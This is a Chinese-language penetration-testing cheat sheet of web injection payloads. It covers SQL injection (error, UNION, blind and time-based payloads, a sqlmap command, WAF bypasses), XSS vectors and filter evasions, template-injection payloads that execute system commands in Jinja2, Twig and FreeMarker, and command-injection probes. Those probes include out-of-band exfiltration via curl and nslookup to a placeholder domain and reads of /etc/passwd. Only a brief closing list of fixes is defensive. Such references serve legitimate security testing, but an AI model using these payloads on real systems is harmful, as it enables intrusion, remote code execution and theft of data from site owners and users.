# Web 注入面速查（SQLi / XSS / SSTI / 命令注入）

所有示例均为占位模板：TARGET 为被测站点，PARAM/PAYLOAD 为注入点与载荷。
先差异验证，再决定是否继续；无回显一律走 OAST_DOMAIN 外带。

## SQL 注入

- 探测差异：`' and 1=1 -- -` 与 `' and 1=2 -- -` 响应对比；`'` 单引号报错特征。
- 报错注入（MySQL）：`' AND extractvalue(1,concat(0x7e,version())) -- -`
- 联合注入：`' UNION SELECT 1,2,3-- -` 定位回显列，再 `group_concat(table_name)`。
- 布尔盲注：`' AND (SELECT substr(version(),1,1))='5' -- -`；延时：`' AND sleep(5) -- -`
  （PostgreSQL 用 `pg_sleep(5)`，MSSQL 用 `WAITFOR DELAY '0:0:5'`）。
- 自动化：`sqlmap -u "http://TARGET/ENDPOINT?PARAM=1" --batch --level 3 --risk 2 --random-agent`
- 绕 WAF：注释符 `/**/` 切关键字（`S/**/ELECT`）、大小写混合、`%0a` 换行、双重编码。

## XSS

- 反射验证：`<script>alert(1)</script>`、`<img src=x onerror=alert(1)>`、`<svg/onload=alert(1)>`
- 编码绕过：HTML 实体、JS unicode（`\u003c`）、大小写/双写、`<scr<script>ipt>`。
- 存储型：把 PAYLOAD 写入留言/昵称/头像字段，二次访问确认执行。
- 上下文逃逸：`" onmouseover="alert(1)`（属性内）、`` `-alert(1)-` ``（模板字符串）。

## SSTI

- 探测：`{{7*7}}`、`${7*7}`、`<%= 7*7 %>` 出现 49。
- Jinja2：`{{ config }}`、`{{ ''.__class__.__mro__[1].__subclasses__() }}` 找执行类。
- Twig：`{{['_self']|map('system','id')}}`；FreeMarker：`<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`。

## 命令注入

- 探测：`;id` / `|id` / `$(id)` / 反引号 `` `id` `` / `%0aid`（换行）。
- 盲注延时：`sleep 5`、`ping -c 5 127.0.0.1`、`timeout 5 cat /dev/null`。
- 无回显外带：`curl http://OAST_DOMAIN/$(whoami)`、`nslookup $(id).OAST_DOMAIN`。
- 受限回显：`id > /tmp/o && cat /tmp/o`；`;cat /etc/passwd | base64`。

## 修复要点

参数化查询；输出编码按上下文（HTML/JS/URL/CSS）；模板引擎禁用任意对象执行；
命令拼接改为参数数组传递并白名单校验；统一入口做输入归一化。
